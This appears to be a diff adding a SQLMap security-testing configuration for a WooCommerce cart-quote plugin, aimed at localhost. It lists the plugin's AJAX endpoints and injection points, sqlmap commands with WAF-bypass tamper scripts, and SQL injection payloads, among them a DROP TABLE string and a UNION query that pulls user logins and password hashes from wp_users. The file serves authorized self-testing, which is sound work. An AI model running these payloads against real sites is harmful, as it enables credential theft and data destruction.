@@ -1,0 +1,128 @@
+# SQLMap Configuration for Cart Quote WooCommerce & Email Plugin
+# ============================================================
+# This file contains SQLMap configurations for security testing
+# the plugin's AJAX endpoints and database operations.
+
+# Target Configuration
+# --------------------
+TARGET_URL="http://localhost/wp-admin/admin-ajax.php"
+
+# Authentication (if needed)
+# --------------------------
+# COOKIE="wordpress_logged_in_xxx=your_cookie_here"
+# AUTH_TYPE="cookie"
+
+# AJAX Endpoints to Test
+# ----------------------
+# Each endpoint is defined with its action and parameters
+
+[quote_submission]
+action = cart_quote_submit
+method = POST
+params = nonce, billing_first_name, billing_last_name, billing_email, billing_phone, billing_company, preferred_date, preferred_time, contract_duration, meeting_requested
+injection_points = billing_first_name, billing_email, billing_company
+
+[update_cart]
+action = cart_quote_update_cart
+method = POST
+params = nonce, cart_item_key, quantity
+injection_points = cart_item_key
+
+[remove_item]
+action = cart_quote_remove_item
+method = POST
+params = nonce, cart_item_key
+injection_points = cart_item_key
+
+[get_cart]
+action = cart_quote_get_cart
+method = POST
+params = nonce
+
+[admin_update_status]
+action = cart_quote_admin_update_status
+method = POST
+params = nonce, id, status
+injection_points = id, status
+requires_auth = true
+
+[admin_save_notes]
+action = cart_quote_admin_save_notes
+method = POST
+params = nonce, id, notes
+injection_points = id, notes
+requires_auth = true
+
+[admin_export_csv]
+action = cart_quote_admin_export_csv
+method = GET
+params = nonce, status, date_from, date_to
+injection_points = status, date_from, date_to
+requires_auth = true
+
+# SQLMap Command Templates
+# ------------------------
+
+# Basic SQL injection test
+# sqlmap -u "http://localhost/wp-admin/admin-ajax.php" \
+#   --data="action=cart_quote_submit&nonce=test&billing_first_name=TEST" \
+#   -p "billing_first_name" \
+#   --level=5 --risk=3 --batch --random-agent
+
+# Test with tamper scripts for WAF bypass
+# sqlmap -u "http://localhost/wp-admin/admin-ajax.php" \
+#   --data="action=cart_quote_admin_update_status&nonce=test&id=1&status=pending" \
+#   -p "id" \
+#   --tamper=space2comment,between \
+#   --level=5 --risk=3 --batch
+
+# Test for time-based blind injection
+# sqlmap -u "http://localhost/wp-admin/admin-ajax.php" \
+#   --data="action=cart_quote_update_cart&nonce=test&cart_item_key=test&quantity=1" \
+#   -p "cart_item_key" \
+#   --technique=T \
+#   --level=5 --risk=3 --batch
+
+# Test search parameter
+# sqlmap -u "http://localhost/wp-admin/admin-ajax.php" \
+#   --data="action=cart_quote_get_cart&nonce=test&search=TEST" \
+#   -p "search" \
+#   --level=5 --risk=3 --batch
+
+# Common Injection Payloads for Manual Testing
+# --------------------------------------------
+# These can be used for manual testing or burp intruder
+
+# Boolean-based
+# ' OR '1'='1
+# ' OR '1'='1'--
+# ' OR '1'='1'/*
+# 1' OR '1'='1
+
+# Time-based
+# '; WAITFOR DELAY '0:0:5'--
+# '; SELECT SLEEP(5)--
+# 1'; SELECT pg_sleep(5);--
+
+# UNION-based
+# ' UNION SELECT NULL--
+# ' UNION SELECT NULL,NULL,NULL--
+# ' UNION SELECT user(),database(),version()--
+
+# Error-based
+# ' AND extractvalue(1,concat(0x7e,version()))--
+# ' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+
+# CSV Export SQL Injection Tests
+# ------------------------------
+# Test via filter parameters that might be used in database queries
+# date_from=2024-01-01' OR '1'='1
+# date_to=2024-12-31'; DROP TABLE wp_cart_quote_submissions;--
+# status=pending' UNION SELECT user_login,user_pass FROM wp_users--
+
+# Notes
+# -----
+# - Always get proper authorization before testing
+# - These tests should be run against a development/staging environment
+# - Keep database backups before testing
+# - Review all detected vulnerabilities with the development team
